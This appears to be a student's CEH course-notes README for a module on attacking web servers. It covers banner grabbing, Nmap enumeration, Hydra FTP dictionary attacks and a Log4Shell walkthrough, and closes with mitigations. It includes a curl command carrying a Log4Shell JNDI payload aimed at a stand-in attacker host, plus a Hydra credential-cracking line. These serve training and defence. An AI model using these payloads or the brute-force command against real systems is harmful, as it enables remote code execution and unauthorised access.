# Module 13 — Hacking Web Servers

## Overview
Footprinting, enumeration, and exploitation of web server infrastructure, including a real-world CVE walkthrough (Log4Shell).

## Learning Objectives
- Footprint web servers using Netcraft and Telnet banner grabbing
- Enumerate server details using Nmap NSE http scripts
- Perform FTP credential attacks via dictionary attack
- Understand exploitation of the Log4j (Log4Shell / CVE-2021-44228) vulnerability

## Labs Completed
- Lab 1.1 — Footprint a Web Server Using Netcraft and Telnet
- Lab 1.2 — Enumerate Web Server Info Using Nmap NSE
- Lab 2.1 — Crack FTP Credentials via Dictionary Attack
- Lab 2.2 — Exploit Log4j Vulnerability (CVE-2021-44228)
- Lab 3 — Web Server Footprinting & Attacks Using ShellGPT

## Tools & Technologies
- Netcraft
- Telnet
- Nmap NSE (http-*)
- Hydra
- Log4Shell lab range (isolated)

## Key Commands / Techniques
```bash
nmap -p80,443 --script http-headers,http-title,http-server-header target.com
hydra -l admin -P rockyou.txt ftp://target.com
curl -H 'X-Api-Version: ${jndi:ldap://attacker-lab-host/a}' http://target.com/  # Log4Shell PoC header (isolated lab only)
```

## Sample Payloads / Test Strings
```
${jndi:ldap://<lab-controlled-host>/a}   # Log4Shell trigger string — lab/CVE study only
```
> All commands and payloads above were executed strictly within EC-Council's isolated CEH iLabs cyber range against consenting lab targets, for educational and certification purposes only.

## Detection & Mitigation
- Patch Log4j to >= 2.17.1 or set log4j2.formatMsgNoLookups=true
- Disable directory listing and remove verbose server/version banners
- Enforce strong FTP/SSH credentials with account lockout and MFA where possible
- Deploy a WAF to filter known exploit signatures (e.g., JNDI lookup strings)
- Maintain an asset inventory + SBOM for rapid patch response to disclosed CVEs

## Key Definitions
| Term | Definition |
|---|---|
| **Banner Grabbing** | Extracting service/version information from a server's response headers/banners. |
| **Log4Shell** | CVE-2021-44228 — a critical RCE vulnerability in Apache Log4j via JNDI lookup injection. |
| **Directory Listing** | A web server misconfiguration exposing full directory contents to unauthenticated users. |

## References / Sources
- CVE-2021-44228 — NVD
- OWASP Web Server Hardening Guide
- EC-Council CEH v13 Module 13

---
[⬅ Back to main README](../../README.md)
